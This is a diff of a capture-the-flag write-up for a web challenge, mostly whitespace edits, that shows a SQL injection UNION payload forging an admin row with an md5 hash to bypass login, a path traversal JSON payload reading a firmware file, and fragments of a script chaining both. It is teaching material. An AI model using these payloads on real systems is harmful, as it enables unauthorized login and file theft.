@@ -11,10 +11,10 @@
 
 ![](/images/orbital-source-tree.png)
 
-This challenge builds on the basics of SQL Injection explored in the `Drobots` challenge.
-It is another case of login bypass, with a much more interesting payload.
+This challenge builds on the basics of SQL Injection explored in the `Drobots` challenge.  
+It is another case of login bypass, with a much more interesting payload.  
 
-The login logic for the application is the following:
+The login logic for the application is the following:  
 
 ```python
 def login(username, password):
@@ -31,17 +31,18 @@ def login(username, password):
         return False
 ```
 
-In a query like this, you could use UNION to include a hand crafted row.
-This way you can provide a username and the hashed password of your choice.
+In a query like this, you could use UNION to include a handcrafted row.  
+This way you can provide a username and the hashed password of your choice.  
 
-The application will internally use these values when comparing the provided password with the hashed one, provided in the injection.
+The application will internally use these values when comparing the provided password with the hashed one.
 
 ```python
 user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)
 ```
 
-We can see that the application uses the `md5` algorithm to hash the passwords before storage.
-This is in the `util.py:passwordVerify` function.
+We can see that the application uses the `md5` algorithm to hash the passwords before storage.  
+This is in the `util.py:passwordVerify` function.  
+
 ```python
 def passwordVerify(hashPassword, password):
     md5Hash = hashlib.md5(password.encode())
@@ -50,53 +51,55 @@ def passwordVerify(hashPassword, password):
     else: return False
 ```
 
-This means that we have to provide the password hashed with `md5` in our payload.
+This means that we have to provide the password hashed with `md5` in our payload.  
 
-Payload:
+Payload:  
+
 ```
 owned" UNION SELECT "admin","21232f297a57a5a743894a0e4a801fc3" FROM users;#
 ```
 
-`admin`: is the target user
-`21232f297a57a5a743894a0e4a801fc3`: is the md5 hash of "admin"
+`admin`: is the target user.  
+`21232f297a57a5a743894a0e4a801fc3`: is the md5 hash of "admin".  
 
-When logging in we provide the injection in the username input and the password 'admin' in the password input.
-
-Here is the resulting query executing on the database:
+When logging in we provide the injection in the username input and the password 'admin' in the password input.  
+  
+Here is the resulting query executing on the database:  
 
 ```sql
 SELECT username, password FROM users WHERE username = "owned" UNION SELECT "admin", "21232f297a57a5a743894a0e4a801fc3" FROM users;#"
 ```
 
-When executing, the database will not return results for the `owned` username, which means it will use our specified row.
+When executing, the database will not return results for the `owned` username, which means it will use our specified row.  
 
 ![](/images/orbital_login.png)
 
-We are then logged into a dashboard:
+We are then logged into a dashboard:  
 
 ![](/images/orbital_dashboard.png)
 
 ##### LFI in export function
 
-In this dashboard, there is an export function for various communications.
+In this dashboard, there is an export function for various communications.  
 
 ![](/images/orbital_export.png)
 
-The application has an export api that relatively includes an mp3 file.
-This file is then downloaded.
+The application has an export api that relatively includes an mp3 file.  
+This file is then downloaded.  
 
-By using path traversal, we can traverse the filesystem back to the root directory to include our target `signal_sleuth_firmware`.
+By using path traversal, we can traverse the filesystem back to the root directory to include our target `signal_sleuth_firmware`.  
 
 ![](/images/orbital_export_request.png)
 
-With the following payload:
+With the following payload:  
+
 ```json
 {
     "name":"../../../../../../../../../../../signal_sleuth_firmware"
 }
 ```
 
-Once we obtain this file, it contains the flag !
+Once we obtain this file, it contains the flag !  
 
 #### Script
 ```python
@@ -119,7 +122,5 @@ if __name__ == "__main__":
     flag = s.post(TARGET + EXPORT_ENDPOINT, json=FLAG_LFI_PAYLOAD)
     print(flag.text)
 ```
-
-This script will chain the exploits and print the flag.
 
 
